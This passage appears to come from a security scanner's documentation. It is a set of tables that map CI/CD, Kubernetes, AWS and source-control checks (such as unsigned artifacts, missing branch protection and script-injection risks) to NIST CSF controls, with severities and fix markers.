| [`ECR-001`](#detail-ecr-001) | Image scanning on push not enabled | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`ECR-002`](#detail-ecr-002) | Image tags are mutable | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`ECR-007`](#detail-ecr-007) | Inspector v2 enhanced scanning disabled for ECR | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`GCB-008`](#detail-gcb-008) | No vulnerability scanning step in Cloud Build pipeline | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GHA-020`](#detail-gha-020) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-019`](#detail-gl-019) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`JF-020`](#detail-jf-020) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`K8S-001`](#detail-k8s-001) | Container image not pinned by sha256 digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`SCM-005`](#detail-scm-005) | Dependabot security updates are not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |

### PR.PS-04: Log records are generated and made available for continuous monitoring { #ctrl-pr-ps-04 }

**Evidenced by 9 checks** across 3 providers (AWS, CircleCI, Jenkins).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`CB-003`](#detail-cb-003) | Build logging not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CC-011`](#detail-cc-011) | No store_test_results step (test results not archived) | <span class="pg-sev pg-sev--low">LOW</span> | [CircleCI](../providers/circleci.md) |  |
| [`CT-001`](#detail-ct-001) | No active CloudTrail trail in region | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CT-002`](#detail-ct-002) | CloudTrail log-file validation disabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CT-003`](#detail-ct-003) | CloudTrail trail is not multi-region | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CWL-001`](#detail-cwl-001) | CodeBuild log group has no retention policy | <span class="pg-sev pg-sev--low">LOW</span> | [AWS](../providers/aws.md) |  |
| [`CWL-002`](#detail-cwl-002) | CodeBuild log group not KMS-encrypted | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`JF-011`](#detail-jf-011) | Pipeline has no `buildDiscarder` retention policy | <span class="pg-sev pg-sev--low">LOW</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`S3-004`](#detail-s3-004) | Artifact bucket access logging not enabled | <span class="pg-sev pg-sev--low">LOW</span> | [AWS](../providers/aws.md) |  |

### PR.PS-05: Installation and execution of unauthorized software are prevented { #ctrl-pr-ps-05 }

**Evidenced by 34 checks** across 12 providers (AWS, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, Dockerfile, GitHub Actions, GitLab CI, Jenkins, Kubernetes, SCM).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-002`](#detail-ado-002) | Script injection via attacker-controllable context | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-016`](#detail-ado-016) | Remote script piped to shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ADO-026`](#detail-ado-026) | Pipeline contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-027`](#detail-ado-027) | Dangerous shell idiom (eval, sh -c variable, backtick exec) | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) |  |
| [`BB-002`](#detail-bb-002) | Script injection via attacker-controllable context | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-012`](#detail-bb-012) | Remote script piped to shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`BB-025`](#detail-bb-025) | Pipeline contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-026`](#detail-bb-026) | Dangerous shell idiom (eval, sh -c variable, backtick exec) | <span class="pg-sev pg-sev--high">HIGH</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-003`](#detail-bk-003) | Untrusted Buildkite variable interpolated in command | <span class="pg-sev pg-sev--high">HIGH</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CB-011`](#detail-cb-011) | CodeBuild buildspec contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |
| [`CC-002`](#detail-cc-002) | Script injection via untrusted environment variable | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-016`](#detail-cc-016) | Remote script piped to shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`CC-026`](#detail-cc-026) | Config contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-027`](#detail-cc-027) | Dangerous shell idiom (eval, sh -c variable, backtick exec) | <span class="pg-sev pg-sev--high">HIGH</span> | [CircleCI](../providers/circleci.md) |  |
| [`DF-005`](#detail-df-005) | RUN uses shell-eval (eval / sh -c on a variable / backticks) | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`GCB-004`](#detail-gcb-004) | dynamicSubstitutions on with user substitutions in step args | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GCB-006`](#detail-gcb-006) | Dangerous shell idiom (eval, sh -c variable, backtick exec) | <span class="pg-sev pg-sev--high">HIGH</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GHA-003`](#detail-gha-003) | Script injection via untrusted context | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-016`](#detail-gha-016) | Remote script piped to shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-027`](#detail-gha-027) | Workflow contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-028`](#detail-gha-028) | Dangerous shell idiom (eval, sh -c variable, backtick exec) | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-002`](#detail-gl-002) | Script injection via untrusted commit/MR context | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-016`](#detail-gl-016) | Remote script piped to shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GL-025`](#detail-gl-025) | Pipeline contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-026`](#detail-gl-026) | Dangerous shell idiom (eval, sh -c variable, backtick exec) | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`JF-002`](#detail-jf-002) | Script step interpolates attacker-controllable env var | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-012`](#detail-jf-012) | `load` step pulls Groovy from disk without integrity pin | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-016`](#detail-jf-016) | Remote script piped to shell interpreter | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`JF-019`](#detail-jf-019) | Groovy sandbox escape pattern detected | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-029`](#detail-jf-029) | Jenkinsfile contains indicators of malicious activity | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-030`](#detail-jf-030) | Dangerous shell idiom (eval, sh -c variable, backtick exec) | <span class="pg-sev pg-sev--high">HIGH</span> | [Jenkins](../providers/jenkins.md) |  |
| [`K8S-005`](#detail-k8s-005) | Container securityContext.privileged: true | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`SCM-022`](#detail-scm-022) | Repo Actions permissions allow any source (no allow-list) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-039`](#detail-scm-039) | Active ruleset doesn't pin a required workflow | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |

### PR.PS-06: Secure software development practices are integrated, and their performance is monitored throughout the SDLC { #ctrl-pr-ps-06 }

**Evidenced by 47 checks** across 10 providers (AWS, Azure DevOps, Bitbucket, Buildkite, CircleCI, Cloud Build, GitHub Actions, GitLab CI, Jenkins, SCM).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-006`](#detail-ado-006) | Artifacts not signed | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-024`](#detail-ado-024) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`BB-006`](#detail-bb-006) | Artifacts not signed | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-024`](#detail-bb-024) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BK-007`](#detail-bk-007) | Deploy step not gated by a manual block / input | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`BK-009`](#detail-bk-009) | Artifacts not signed (no cosign/sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CC-006`](#detail-cc-006) | Artifacts not signed (no cosign/sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-024`](#detail-cc-024) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`GCB-009`](#detail-gcb-009) | Artifacts not signed (no cosign / sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Cloud Build](../providers/cloudbuild.md) |  |
| [`GHA-006`](#detail-gha-006) | Artifacts not signed (no cosign/sigstore step) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-024`](#detail-gha-024) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-006`](#detail-gl-006) | Artifacts not signed | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-024`](#detail-gl-024) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`JF-006`](#detail-jf-006) | Artifacts not signed | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`JF-028`](#detail-jf-028) | No SLSA provenance attestation produced | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Jenkins](../providers/jenkins.md) |  |
| [`LMB-001`](#detail-lmb-001) | Lambda function has no code-signing config | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`SCM-001`](#detail-scm-001) | Default branch has no protection rule | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-002`](#detail-scm-002) | Default branch protection does not require pull request reviews | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-003`](#detail-scm-003) | GitHub default code scanning is not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-006`](#detail-scm-006) | Default branch protection does not require signed commits | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-007`](#detail-scm-007) | Default branch protection allows force-pushes | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-008`](#detail-scm-008) | Default branch protection does not require status checks | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-009`](#detail-scm-009) | Default branch protection allows branch deletion | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-010`](#detail-scm-010) | Branch protection allows administrators to bypass | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-011`](#detail-scm-011) | Default branch protection does not require CODEOWNERS reviews | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-012`](#detail-scm-012) | Default branch protection keeps stale reviews after a push | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-013`](#detail-scm-013) | Default branch protection does not require conversation resolution | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
| [`SCM-014`](#detail-scm-014) | Default branch protection does not require approval of the most recent push | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-017`](#detail-scm-017) | Repository has no CODEOWNERS file | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-018`](#detail-scm-018) | Required PR reviews can be bypassed by named identities | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-021`](#detail-scm-021) | Actions can approve pull requests (self-approval bypass) | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-023`](#detail-scm-023) | Deployment environment lacks required-reviewer protection | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-029`](#detail-scm-029) | Repository ruleset is in evaluate / disabled mode (not enforced) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-030`](#detail-scm-030) | Repository ruleset has bypass actor with bypass_mode: always | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-031`](#detail-scm-031) | Repo allows auto-merge (no human-timing gate) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-032`](#detail-scm-032) | Active ruleset doesn't require a PR review (governance theater) | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-033`](#detail-scm-033) | Active ruleset doesn't require status checks | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-034`](#detail-scm-034) | Active ruleset doesn't block force-push | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-035`](#detail-scm-035) | Active ruleset doesn't block branch deletion | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
| [`SCM-036`](#detail-scm-036) | Active ruleset doesn't require signed commits | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-037`](#detail-scm-037) | Active ruleset's pull_request rule doesn't dismiss stale reviews | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-038`](#detail-scm-038) | Active ruleset doesn't require linear history | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
| [`SCM-039`](#detail-scm-039) | Active ruleset doesn't pin a required workflow | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
| [`SCM-040`](#detail-scm-040) | Active ruleset doesn't gate on code scanning results | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
| [`SCM-041`](#detail-scm-041) | Active ruleset doesn't gate on a deployment environment | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
| [`SIGN-001`](#detail-sign-001) | No AWS Signer profile defined for Lambda deploys | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`SIGN-002`](#detail-sign-002) | AWS Signer profile is revoked or inactive | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |

### PR.IR-01: Networks and environments are protected from unauthorized logical access and usage { #ctrl-pr-ir-01 }

**Evidenced by 39 checks** across 9 providers (AWS, Azure DevOps, Bitbucket, CircleCI, Dockerfile, GitHub Actions, GitLab CI, Jenkins, Kubernetes).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ADO-010`](#detail-ado-010) | Cross-pipeline `download:` ingestion unverified | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-011`](#detail-ado-011) | `template: <local-path>` on PR-validated pipeline | <span class="pg-sev pg-sev--high">HIGH</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-012`](#detail-ado-012) | Cache@2 key derives from $(System.PullRequest.*) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Azure DevOps](../providers/azure.md) |  |
| [`ADO-019`](#detail-ado-019) | `extends:` template on PR-validated pipeline points to local path | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Azure DevOps](../providers/azure.md) |  |
| [`BB-010`](#detail-bb-010) | Deploy step ingests pull-request artifact unverified | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`BB-018`](#detail-bb-018) | Cache key derives from attacker-controllable input | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Bitbucket](../providers/bitbucket.md) |  |
| [`CC-012`](#detail-cc-012) | Dynamic config via `setup: true` enables code injection | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-013`](#detail-cc-013) | Deploy job in workflow has no branch filter | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CC-025`](#detail-cc-025) | Cache key derives from attacker-controllable input | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [CircleCI](../providers/circleci.md) |  |
| [`CP-003`](#detail-cp-003) | Source stage using polling instead of event-driven trigger | <span class="pg-sev pg-sev--low">LOW</span> | [AWS](../providers/aws.md) |  |
| [`CP-007`](#detail-cp-007) | CodePipeline v2 PR trigger accepts all branches | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`DF-013`](#detail-df-013) | EXPOSE declares sensitive remote-access port | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`ECR-003`](#detail-ecr-003) | Repository policy allows public access | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |
| [`GHA-002`](#detail-gha-002) | pull_request_target checks out PR head | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`GHA-009`](#detail-gha-009) | workflow_run downloads upstream artifact unverified | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-010`](#detail-gha-010) | Local action (./path) on untrusted-trigger workflow | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-011`](#detail-gha-011) | Cache key derives from attacker-controllable input | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-013`](#detail-gha-013) | issue_comment trigger without author guard | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-044`](#detail-gha-044) | Build tool runs lifecycle scripts on untrusted-trigger workflow | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-045`](#detail-gha-045) | Caller-controlled ref input feeds actions/checkout | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-046`](#detail-gha-046) | Manual PR-head fetch on untrusted-trigger workflow | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitHub Actions](../providers/github.md) |  |
| [`GL-010`](#detail-gl-010) | Multi-project pipeline ingests upstream artifact unverified | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-011`](#detail-gl-011) | include: local file pulled in MR-triggered pipeline | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`GL-012`](#detail-gl-012) | Cache key derives from MR-controlled CI variable | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`JF-013`](#detail-jf-013) | copyArtifacts ingests another job's output unverified | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Jenkins](../providers/jenkins.md) |  |
| [`K8S-022`](#detail-k8s-022) | Service exposes SSH (port 22) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-026`](#detail-k8s-026) | LoadBalancer Service has no loadBalancerSourceRanges | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-028`](#detail-k8s-028) | Container declares hostPort | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`K8S-032`](#detail-k8s-032) | Namespace lacks default-deny NetworkPolicy | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-038`](#detail-k8s-038) | NetworkPolicy ingress / egress allows all sources or destinations | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-041`](#detail-k8s-041) | Service.externalIPs allows traffic interception (CVE-2020-8554) | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-043`](#detail-k8s-043) | Ingress rule has wildcard or missing host (catch-all) | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`LMB-002`](#detail-lmb-002) | Lambda function URL has AuthType=NONE | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`LMB-004`](#detail-lmb-004) | Lambda resource policy allows wildcard principal | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |
| [`PBAC-001`](#detail-pbac-001) | CodeBuild project has no VPC configuration | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`PBAC-002`](#detail-pbac-002) | CodeBuild service role shared across multiple projects | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`PBAC-003`](#detail-pbac-003) | CodeBuild security group allows 0.0.0.0/0 all-port egress | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`PBAC-005`](#detail-pbac-005) | CodePipeline stage action roles mirror the pipeline role | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`S3-001`](#detail-s3-001) | Artifact bucket public access block not fully enabled | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [AWS](../providers/aws.md) |  |

### PR.IR-03: Mechanisms are implemented to achieve resilience requirements in normal and adverse situations { #ctrl-pr-ir-03 }

**Evidenced by 6 checks** across 2 providers (AWS, Kubernetes).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`CD-001`](#detail-cd-001) | Automatic rollback on failure not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CD-003`](#detail-cd-003) | No CloudWatch alarm monitoring on deployment group | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`K8S-015`](#detail-k8s-015) | Container missing resources.limits.memory | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-016`](#detail-k8s-016) | Container missing resources.limits.cpu | <span class="pg-sev pg-sev--low">LOW</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-033`](#detail-k8s-033) | Namespace lacks ResourceQuota or LimitRange | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`S3-003`](#detail-s3-003) | Artifact bucket versioning not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |

### DE.CM-01: Networks and network services are monitored to find potentially adverse events { #ctrl-de-cm-01 }

**Evidenced by 1 check** across AWS.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`S3-004`](#detail-s3-004) | Artifact bucket access logging not enabled | <span class="pg-sev pg-sev--low">LOW</span> | [AWS](../providers/aws.md) |  |

### DE.CM-06: External service provider activities and services are monitored { #ctrl-de-cm-06 }

**Evidenced by 2 checks** across AWS.

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`CB-007`](#detail-cb-007) | CodeBuild webhook has no filter group | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`EB-002`](#detail-eb-002) | EventBridge rule has a wildcard target ARN | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |

### DE.CM-09: Computing hardware and software, runtime environments, and their data are monitored { #ctrl-de-cm-09 }

**Evidenced by 15 checks** across 5 providers (AWS, Buildkite, Dockerfile, Kubernetes, SCM).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`BK-012`](#detail-bk-012) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Buildkite](../providers/buildkite.md) |  |
| [`CB-003`](#detail-cb-003) | Build logging not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CT-001`](#detail-ct-001) | No active CloudTrail trail in region | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`CT-002`](#detail-ct-002) | CloudTrail log-file validation disabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CT-003`](#detail-ct-003) | CloudTrail trail is not multi-region | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`CW-001`](#detail-cw-001) | No CloudWatch alarm on CodeBuild FailedBuilds metric | <span class="pg-sev pg-sev--low">LOW</span> | [AWS](../providers/aws.md) |  |
| [`CWL-001`](#detail-cwl-001) | CodeBuild log group has no retention policy | <span class="pg-sev pg-sev--low">LOW</span> | [AWS](../providers/aws.md) |  |
| [`CWL-002`](#detail-cwl-002) | CodeBuild log group not KMS-encrypted | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`DF-007`](#detail-df-007) | No HEALTHCHECK directive declared | <span class="pg-sev pg-sev--low">LOW</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`EB-001`](#detail-eb-001) | No EventBridge rule for CodePipeline failure notifications | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`K8S-024`](#detail-k8s-024) | Container missing both livenessProbe and readinessProbe | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`SCM-003`](#detail-scm-003) | GitHub default code scanning is not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
